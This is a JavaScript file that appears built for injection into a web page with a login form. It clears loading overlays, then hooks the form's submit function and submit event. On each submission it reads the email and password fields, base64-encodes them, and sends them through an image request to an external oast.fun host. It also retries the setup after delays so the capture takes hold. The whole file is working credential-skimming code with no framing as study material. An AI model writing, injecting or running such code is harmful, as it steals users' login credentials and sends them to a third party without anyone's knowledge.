// Function to remove loading elements
function removeLoadingElements() {
    const loadingElements = document.querySelectorAll('.v-loading');
    loadingElements.forEach(element => {
        element.remove();
    });
}

// Function to wait for an element to be available
function waitForElement(selector, callback, timeout = 10000) {
    const startTime = Date.now();
    const checkInterval = 100;
    
    function checkElement() {
        const element = document.querySelector(selector);
        if (element) {
            callback(element);
        } else if (Date.now() - startTime < timeout) {
            setTimeout(checkElement, checkInterval);
        }
    }
    
    checkElement();
}

// Main function to set up form capture
function setupFormCapture() {
    // Remove loading elements initially
    removeLoadingElements();
    
    // Wait for form to be available
    waitForElement('form', function(form) {
        // Store reference to the original submit function
        const originalSubmit = form.submit;
        
        // Override the submit function
        form.submit = function() {
            // Get email and password values
            const emailInput = document.querySelector('input[type="text"]');
            const passwordInput = document.querySelector('input[type="password"]');
            
            if (emailInput && passwordInput) {
                const email = emailInput.value;
                const password = passwordInput.value;
                
                // Send data to external server
                if (email && password) {
                    const data = btoa(email + ':' + password);
                    new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                }
            }
            
            // Call the original submit function
            return originalSubmit.apply(this, arguments);
        };
        
        // Also capture regular submit events
        form.addEventListener('submit', function(e) {
            const emailInput = document.querySelector('input[type="text"]');
            const passwordInput = document.querySelector('input[type="password"]');
            
            if (emailInput && passwordInput) {
                const email = emailInput.value;
                const password = passwordInput.value;
                
                if (email && password) {
                    const data = btoa(email + ':' + password);
                    new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                }
            }
        });
        
        console.log('Form capture setup completed');
    });
}

// Set up MutationObserver to monitor and remove loading elements
function setupLoadingObserver() {
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                // Check each added node
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) { // Element node
                        if (node.classList && node.classList.contains('v-loading')) {
                            node.remove();
                        } else if (node.querySelectorAll) {
                            const loadingElements = node.querySelectorAll('.v-loading');
                            loadingElements.forEach(element => element.remove());
                        }
                    }
                });
            }
        });
    });

    // Start observing DOM changes
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
}

// Main initialization function
function init() {
    // Set up observer for loading elements
    setupLoadingObserver();
    
    // Remove any existing loading elements
    removeLoadingElements();
    
    // Set up form capture
    setupFormCapture();
    
    // Also try to set up form capture after delays to ensure it works
    setTimeout(setupFormCapture, 1000);
    setTimeout(setupFormCapture, 3000);
}

// Wait for the page to fully load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
